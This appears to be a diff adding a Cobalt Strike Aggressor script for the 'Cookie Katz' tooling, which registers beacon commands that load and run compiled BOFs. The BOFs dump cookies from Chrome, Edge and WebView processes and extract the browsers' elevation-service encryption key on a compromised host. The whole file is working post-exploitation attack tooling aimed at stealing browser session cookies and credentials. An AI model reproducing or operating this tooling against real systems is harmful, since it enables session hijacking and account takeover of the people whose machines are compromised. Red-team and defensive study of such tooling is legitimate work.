@@ -1,0 +1,194 @@
+debug(5);
+
+beacon_command_group(
+   "cookie-katz",
+   "Cookie Katz",
+   "Commands to dump cookies from Chrome based browsers");
+
+beacon_command_register(
+   "cookie-katz",
+   "Dump cookies from Chrome or Edge",
+   "Dump cookies from Chrome or Edge\n\nUse: cookie-katz [chrome|edge|webview] [pid]",
+   "cookie-katz"
+);
+
+beacon_command_register(
+   "cookie-katz-find",
+   "Find processes for cookie-katz",
+   "Find processes for cookie-katz\n\nUse: cookie-katz-find [chrome|edge|webview]",
+   "cookie-katz"
+);
+
+beacon_command_register(
+   "elevation-katz",
+   "Dump elevation service encryption key",
+   "Dump elevation service encryption key\n\nUse: elevation-katz [chrome|edge] [useHW] [useTL32] [wait:<ms>] [terminate] [executable:<path>] [module:<path>]",
+   "elevation-katz"
+);
+
+
+alias cookie-katz {
+    local('$bid $browser $pid $pidStr $handle $data $args $path');
+    if (size(@_) != 3) {
+        berror($1, "Use: [chrome|edge|webview] [pid]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser, $pidStr) = @_;
+    if ($browser !in @("chrome", "edge", "webview")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    $pid = [Integer parseInt: $pidStr];
+    if ($pid is $null) {
+        berror($1, "Could not parse pid '$pidStr $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "CookieKatzBOF.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "zi", "/$browser", $pid);
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias cookie-katz-find {
+    local('$bid $browser $handle $data $args $path');
+    if (size(@_) != 2) {
+        berror($1, "Use: [chrome|edge|webview]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    # Check arguments
+    ($bid, $browser) = @_;
+    if ($browser !in @("chrome", "edge", "webview")) {
+        berror($1, "Unsupported browser: '$browser $+ '");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "ListChromeProcessCookies.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $args   = bof_pack($1, "z", "/$browser");
+
+    # Execute it
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+sub parse_elevation_args {
+    local('%args $i $arg');
+    %args = %(
+        browser => "",
+        terminate => 0,
+        useHW => 0,
+        useTL32 => 0,
+        wait => 500,
+        executable => "",
+        module => ""
+    );
+
+    foreach $i => $arg ($2) {
+        if ($arg eq "chrome" || $arg eq "edge") {
+            %args["browser"] = $arg;
+        }
+        else if ($arg eq "terminate") {
+            %args["terminate"] = 1;
+        }
+        else if ($arg eq "useHW") {
+            %args["useHW"] = 1;
+        }
+        else if ($arg eq "useTL32") {
+            %args["useTL32"] = 1;
+        }
+        else if ($arg hasmatch '^wait:\d+') {
+            %args["wait"] = parseNumber(substr($arg, 5));
+        }
+        else if ($arg hasmatch '^module:.') {
+            %args["module"] = substr($arg, 7);
+        }
+        else if ($arg hasmatch '^executable:.') {
+            %args["executable"] = substr($arg, 11);
+        }
+        else {
+            berror($1, "Unknown argument: $arg")
+        }
+    }
+
+    return %args;
+}
+
+alias elevation-katz {
+    local('$bid %cmd_args $handle $data $args $path');
+    if (size(@_) < 2) {
+        berror($1, "Use: [chrome|edge] [useHW] [useTL32] [wait:<ms>] [terminate] [executable:<path>] [module:<path>]");
+        return;
+    }
+    else if (barch($1) eq "x86") {
+        berror($1, "Not a x64 beacon!");
+        return;
+    }
+
+    $bid = shift(@_);
+    %cmd_args = parse_elevation_args($bid, @_);
+
+    if (%cmd_args["browser"] eq "" && (%cmd_args["module"] eq "" | %cmd_args["executable"] eq "")) {
+        berror($bid, "Provide either browser (chrome|edge) or module:<module> and executable:<path>");
+        return;
+    }
+
+    # Read the BOF
+    $path = getFileProper(script_resource(""), "release", "ElevationKatzBOF.x64.o");
+    if (!-isFile $path) {
+        berror($1, "$path does not exist");
+        return;
+    }
+    $handle = openf($path);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    # browser, teminate, useHW, useTL32, wait, executable, module
+    # const char*, short, short, short, int, const wchar_t*, const wchar_t*
+    $args   = bof_pack(
+        $bid,
+        "zsssiZZ",
+        %cmd_args["browser"],
+        %cmd_args["terminate"],
+        %cmd_args["useHW"],
+        %cmd_args["useTL32"],
+        %cmd_args["wait"],
+        %cmd_args["executable"],
+        %cmd_args["module"]
+    );
+
+    # Execute it
+    beacon_inline_execute($bid, $data, "go", $args);
+}
